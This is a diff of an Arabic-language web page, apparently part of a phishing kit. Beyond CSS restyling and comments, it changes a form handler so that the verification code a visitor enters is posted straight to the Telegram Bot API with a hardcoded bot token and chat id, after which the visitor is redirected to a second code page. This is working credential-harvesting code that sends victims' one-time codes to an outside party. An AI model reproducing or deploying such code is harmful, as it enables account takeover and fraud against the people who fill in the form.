@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="ar">
 
 <head>
@@ -45,36 +46,39 @@
             background-color: #FFF !important;
         }
 
+        /* الحفاظ على الأزرق */
         .bg-danger {
-            background-color: #0000FF !important;
+            background-color: #0000FF !important; /* أزرق */
         }
 
         .text-danger {
-            color: #0000FF !important;
+            color: #0000FF !important; /* أزرق */
         }
 
+        /* تغيير محاذاة النصوص إلى أقصى اليمين */
         body, h6, label, input, button, small, footer, .form-group {
             text-align: right !important;
         }
 
+        /* تصميم زر التأكيد ليكون في الوسط وأكبر ومدور */
         .form-group.centered-button {
             text-align: center !important;
-            margin-top: 10px;
-            margin-bottom: 10px;
+            margin-top: 10px; /* تقليل المسافة العلوية */
+            margin-bottom: 10px; /* تقليل المسافة السفلية */
         }
 
         .form-group.centered-button button {
             font-size: 1.5rem;
             padding: 15px 30px;
             width: auto;
-            border-radius: 50px;
-            background-color: #0000FF;
-            color: #FFF;
-            border: none;
+            border-radius: 50px; /* تحويل الأزرار إلى مستطيلات مدورة من الزوايا */
+            background-color: #0000FF; /* زر أزرق */
+            color: #FFF; /* نص أبيض */
+            border: none; /* إزالة الحدود */
         }
 
         .form-group.centered-button button:hover {
-            background-color: #1E90FF;
+            background-color: #1E90FF; /* أزرق فاتح عند التمرير */
         }
     </style>
 </head>
@@ -108,6 +112,8 @@
 
             </div>
 
+
+
     <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
     <script src="bot_config.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
@@ -124,28 +130,20 @@
                     return;
                 }
 
-                // Get user's IP address
-                $.get("https://api.ipify.org?format=json", function(data) {
-                    const userIp = data.ip;
+                const telegramMessage = "--------هيما بسلم-------\nرمز التحقق: " + tel + "\n--------------------\n";
 
-                    const telegramMessage = "--------هيما بسلم-------\n" +
-                        "رمز التحقق: " + tel + "\n" +
-                        "IP المستخدم: " + userIp + "\n" +
-                        "--------------------\n";
+                const telegramBotUrl = "https://api.telegram.org/bot7926981209:AAEVbVa-TnVm9uDc3Oyi9-7AiduFCKL9YgE/sendMessage";
+                const requestData = {
+                    chat_id: -4624035398,
+                    text: telegramMessage
+                };
 
-                    const telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";
-                    const requestData = {
-                        chat_id: botConfig.chatId,
-                        text: telegramMessage
-                    };
+                $.post(telegramBotUrl, requestData, function(response) {
+                    console.log(response);
 
-                    $.post(telegramBotUrl, requestData, function(response) {
-                        console.log(response);
-
-                        setTimeout(function() {
-                            window.location.href = "code.html";
-                        }, 0);
-                    });
+                    setTimeout(function() {
+                        window.location.href = "code.html";
+                    }, 0);
                 });
             });
         });
